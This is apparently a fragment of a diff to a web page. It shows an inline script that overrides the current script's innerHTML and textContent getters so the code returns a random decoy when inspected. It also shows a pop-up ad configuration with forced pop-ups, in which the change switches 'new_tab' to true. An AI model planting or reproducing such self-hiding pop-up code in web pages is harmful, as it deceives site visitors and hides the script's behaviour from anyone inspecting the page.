@@ -14,7 +14,6 @@
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
     </style>
 </head>
-    
     <script type="application/javascript">
 (function() {
     function randStr(e,t){for(var n="",r=t||"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",o=0;o<e;o++)n+=r.charAt(Math.floor(Math.random()*r.length));return n}function generateContent(){return void 0===generateContent.val&&(generateContent.val="document.dispatchEvent("+randStr(4*Math.random()+3)+");"),generateContent.val}try{Object.defineProperty(document.currentScript,"innerHTML",{get:generateContent}),Object.defineProperty(document.currentScript,"textContent",{get:generateContent})}catch(e){};
@@ -28,7 +27,7 @@
     "popup_fallback": false,
     "popup_force": true,
     "chrome_enabled": true,
-    "new_tab": false,
+    "new_tab": true,
     "frequency_period": 60,
     "frequency_count": 1,
     "trigger_method": 3,
